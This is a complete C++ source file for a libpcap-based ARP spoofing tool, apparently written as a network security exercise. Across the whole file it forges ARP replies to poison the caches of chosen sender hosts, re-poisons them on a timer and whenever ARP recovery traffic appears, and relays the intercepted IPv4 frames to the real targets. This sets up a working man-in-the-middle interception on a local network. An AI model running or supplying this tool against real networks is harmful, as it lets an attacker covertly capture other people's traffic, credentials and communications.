#include <arpa/inet.h>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include <string>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>
#include <vector>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth;
    ArpHdr arp;
};
#pragma pack(pop)

struct Session {
    Ip senderIp;
    Ip targetIp;
    Mac senderMac;
    Mac targetMac;
    EthArpPacket infection;
};

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> "
           "[<sender ip 2> <target ip 2> ...]\n");
}

bool parseIp(const char* text, Ip& ip) {
    in_addr address;
    if (inet_pton(AF_INET, text, &address) != 1)
        return false;
    ip = Ip(ntohl(address.s_addr));
    return true;
}

bool getMyInfo(const char* dev, Mac& myMac, Ip& myIp) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return false;
    }

    ifreq ifr{};
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("SIOCGIFHWADDR");
        close(fd);
        return false;
    }
    myMac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("SIOCGIFADDR");
        close(fd);
        return false;
    }
    sockaddr_in* sin = reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr);
    myIp = Ip(ntohl(sin->sin_addr.s_addr));
    close(fd);
    return true;
}

EthArpPacket makeArp(const Mac& dmac, const Mac& smac, uint16_t op,
                     const Mac& arpSmac, const Ip& sip,
                     const Mac& arpTmac, const Ip& tip) {
    EthArpPacket packet{};
    packet.eth.dmac_ = dmac;
    packet.eth.smac_ = smac;
    packet.eth.type_ = htons(EthHdr::Arp);

    packet.arp.hrd_ = htons(ArpHdr::ETHER);
    packet.arp.pro_ = htons(EthHdr::Ip4);
    packet.arp.hln_ = Mac::Size;
    packet.arp.pln_ = Ip::Size;
    packet.arp.op_ = htons(op);
    packet.arp.smac_ = arpSmac;
    packet.arp.sip_ = htonl(static_cast<uint32_t>(sip));
    packet.arp.tmac_ = arpTmac;
    packet.arp.tip_ = htonl(static_cast<uint32_t>(tip));
    return packet;
}

bool sendArp(pcap_t* pcap, const EthArpPacket& packet) {
    if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet),
                        sizeof(packet)) != 0) {
        fprintf(stderr, "pcap_sendpacket: %s\n", pcap_geterr(pcap));
        return false;
    }
    return true;
}

bool resolveMac(pcap_t* pcap, const Mac& myMac, const Ip& myIp,
                const Ip& findIp, Mac& findMac) {
    EthArpPacket request = makeArp(Mac::broadcastMac(), myMac,
        ArpHdr::Request, myMac, myIp, Mac::nullMac(), findIp);

    for (int retry = 0; retry < 3; retry++) {
        if (!sendArp(pcap, request))
            return false;

        auto end = std::chrono::steady_clock::now() + std::chrono::seconds(2);
        while (std::chrono::steady_clock::now() < end) {
            pcap_pkthdr* header;
            const u_char* packet;
            int res = pcap_next_ex(pcap, &header, &packet);
            if (res == 0)
                continue;
            if (res < 0)
                return false;
            if (header->caplen < sizeof(EthArpPacket))
                continue;

            const EthArpPacket* reply =
                reinterpret_cast<const EthArpPacket*>(packet);
            Ip sip(ntohl(static_cast<uint32_t>(reply->arp.sip_)));
            Ip tip(ntohl(static_cast<uint32_t>(reply->arp.tip_)));

            if (ntohs(reply->eth.type_) == EthHdr::Arp &&
                ntohs(reply->arp.op_) == ArpHdr::Reply &&
                sip == findIp && tip == myIp && reply->arp.tmac_ == myMac) {
                findMac = reply->arp.smac_;
                return true;
            }
        }
        fprintf(stderr, "ARP reply timeout (%d/3)\n", retry + 1);
    }
    return false;
}

void infectAll(pcap_t* pcap, const std::vector<Session>& sessions) {
    for (const Session& session : sessions)
        sendArp(pcap, session.infection);
}

bool relay(pcap_t* pcap, const pcap_pkthdr* header, const u_char* packet,
           const Mac& myMac, const std::vector<Session>& sessions) {
    if (header->caplen < sizeof(EthHdr) || header->caplen != header->len)
        return false;

    const EthHdr* eth = reinterpret_cast<const EthHdr*>(packet);
    if (ntohs(eth->type_) != EthHdr::Ip4 || eth->dmac_ != myMac)
        return false;

    for (const Session& session : sessions) {
        if (eth->smac_ != session.senderMac)
            continue;

        std::vector<u_char> relayPacket(packet, packet + header->caplen);
        EthHdr* relayEth = reinterpret_cast<EthHdr*>(relayPacket.data());
        relayEth->smac_ = myMac;
        relayEth->dmac_ = session.targetMac;

        if (pcap_sendpacket(pcap, relayPacket.data(), relayPacket.size()) != 0)
            fprintf(stderr, "relay: %s\n", pcap_geterr(pcap));
        return true;
    }
    return false;
}

void reinfect(pcap_t* pcap, const pcap_pkthdr* header, const u_char* packet,
              const Mac& myMac, const std::vector<Session>& sessions) {
    if (header->caplen < sizeof(EthArpPacket))
        return;

    const EthArpPacket* arp = reinterpret_cast<const EthArpPacket*>(packet);
    if (ntohs(arp->eth.type_) != EthHdr::Arp || arp->eth.smac_ == myMac)
        return;

    uint16_t op = ntohs(arp->arp.op_);
    Ip sip(ntohl(static_cast<uint32_t>(arp->arp.sip_)));
    Ip tip(ntohl(static_cast<uint32_t>(arp->arp.tip_)));

    for (const Session& session : sessions) {
        bool request = op == ArpHdr::Request &&
                       sip == session.senderIp && tip == session.targetIp;
        bool reply = op == ArpHdr::Reply &&
                     sip == session.targetIp && tip == session.senderIp;
        if (request || reply)
            sendArp(pcap, session.infection);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    const char* dev = argv[1];
    std::vector<Session> sessions;
    for (int i = 2; i < argc; i += 2) {
        Session session{};
        if (!parseIp(argv[i], session.senderIp) ||
            !parseIp(argv[i + 1], session.targetIp)) {
            fprintf(stderr, "invalid IP address\n");
            return EXIT_FAILURE;
        }
        sessions.push_back(session);
    }

    Mac myMac;
    Ip myIp;
    if (!getMyInfo(dev, myMac, myIp))
        return EXIT_FAILURE;

    char errbuf[PCAP_ERRBUF_SIZE]{};
    pcap_t* pcap = pcap_open_live(dev, 65535, 1, 100, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return EXIT_FAILURE;
    }
    if (pcap_datalink(pcap) != DLT_EN10MB) {
        fprintf(stderr, "Ethernet interface is required\n");
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    std::string myMacText = static_cast<std::string>(myMac);
    printf("attacker MAC: %s\n", myMacText.c_str());

    for (Session& session : sessions) {
        if (!resolveMac(pcap, myMac, myIp, session.senderIp,
                        session.senderMac) ||
            !resolveMac(pcap, myMac, myIp, session.targetIp,
                        session.targetMac)) {
            fprintf(stderr, "could not find MAC address\n");
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        session.infection = makeArp(session.senderMac, myMac, ArpHdr::Reply,
            myMac, session.targetIp, session.senderMac, session.senderIp);

        std::string senderIp = static_cast<std::string>(session.senderIp);
        std::string senderMac = static_cast<std::string>(session.senderMac);
        std::string targetIp = static_cast<std::string>(session.targetIp);
        std::string targetMac = static_cast<std::string>(session.targetMac);
        printf("sender=%s/%s target=%s/%s\n", senderIp.c_str(),
               senderMac.c_str(), targetIp.c_str(), targetMac.c_str());
    }

    infectAll(pcap, sessions);
    auto lastInfection = std::chrono::steady_clock::now();

    while (true) {
        auto now = std::chrono::steady_clock::now();
        if (now - lastInfection >= std::chrono::seconds(5)) {
            infectAll(pcap, sessions);
            lastInfection = now;
        }

        pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res < 0) {
            fprintf(stderr, "pcap_next_ex: %s\n", pcap_geterr(pcap));
            break;
        }

        if (!relay(pcap, header, packet, myMac, sessions))
            reinfect(pcap, header, packet, myMac, sessions);
    }

    pcap_close(pcap);
    return EXIT_FAILURE;
}

